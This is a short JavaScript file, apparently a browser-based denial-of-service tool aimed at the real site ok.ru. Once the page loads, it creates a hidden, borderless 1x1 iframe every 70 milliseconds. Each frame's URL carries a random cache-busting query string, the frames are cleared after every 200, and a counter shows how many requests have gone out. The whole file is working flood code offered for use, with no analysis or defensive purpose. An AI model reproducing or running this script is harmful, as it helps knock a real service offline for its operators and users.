let interval,
    iframeIndex = 1,
    count = 0

const TARGET = 'https://ok.ru'
const frameBlock = document.querySelector('#frames')
const counterBlock = document.querySelector('#counter')

window.onload = function () {

    setInterval(() => {
        counterBlock.innerText = count
    }, 1000)

    start()
}

function getRandomArbitrary(min, max) {
    return Math.random() * (max - min) + min
}

function generateRandomSalt() {
    const now = (new Date()).getTime()
    return '?' + now + getRandomArbitrary(0, 100000)
}

function getTarget() {
    const salt = generateRandomSalt()
    return TARGET + salt
}

function drawIframe(block, target, id) {
    let iframe = document.createElement("iframe")
    iframe.src = target
    iframe.id = 'frame' + id
    iframe.style.border = "none"
    iframe.width = 1
    iframe.height = 1
    block.appendChild(iframe)
}

function start() {
    interval = setInterval(() => {
        const target = getTarget()
        drawIframe(frameBlock, target, iframeIndex)
        iframeIndex++
        count++
        if (iframeIndex > 200) {
            clearFrames()
            iframeIndex = 1
        }
    }, 70)
}

function clearFrames() {
    frameBlock.innerHTML = ""
}

function stop() {
    clearInterval(interval)
    clearFrames()
}